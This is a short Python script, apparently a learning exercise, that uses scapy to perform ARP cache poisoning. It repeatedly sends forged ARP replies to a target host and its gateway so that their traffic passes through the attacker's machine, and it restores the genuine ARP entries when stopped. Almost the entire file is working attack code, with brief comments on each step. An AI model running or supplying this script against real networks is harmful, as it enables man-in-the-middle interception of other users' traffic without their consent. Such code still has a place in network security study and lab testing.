import scapy.all as scapy
import time
import optparse

# First we have to create a arp response for trick the target
# This arp response contain target ip target mac and our posioned (gateway) ip
# We automasize the get mac address tool
# We create loop for continutiy
# And we enter options for target and poisoned machines


def get_options():

    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target")
    parser.add_option("-p","--poisoned",dest="poisoned")
    options,argument = parser.parse_args()
    if not options.target:
        print("Enter Target IP")
    if not options.poisoned:
        print("Enter Gateway IP")

    return (options.target,options.poisoned)


def get_mac_address(ipdest):
    Arp_request = scapy.ARP(pdst=ipdest)
    Broad_cast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_pack = Broad_cast/Arp_request
    (ans_list,unans_list) = scapy.srp(combined_pack,timeout=1,verbose=False)
    return ans_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac
                             ,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)


def reset_operation(fooled_ip,gateway_ip):

    target_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=target_mac
                             ,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)
    time.sleep(0.5)

target,poisoned = get_options()
number = 0
try:
    while(True):

        arp_poisoning(target,poisoned)
        arp_poisoning(poisoned,target)
        number += 2
        print("\rSending packets : "+str(number),end="")
        time.sleep(5)
except KeyboardInterrupt:
    print("\n Quit and Reseting")
    reset_operation(target,poisoned)
    reset_operation(poisoned, target)
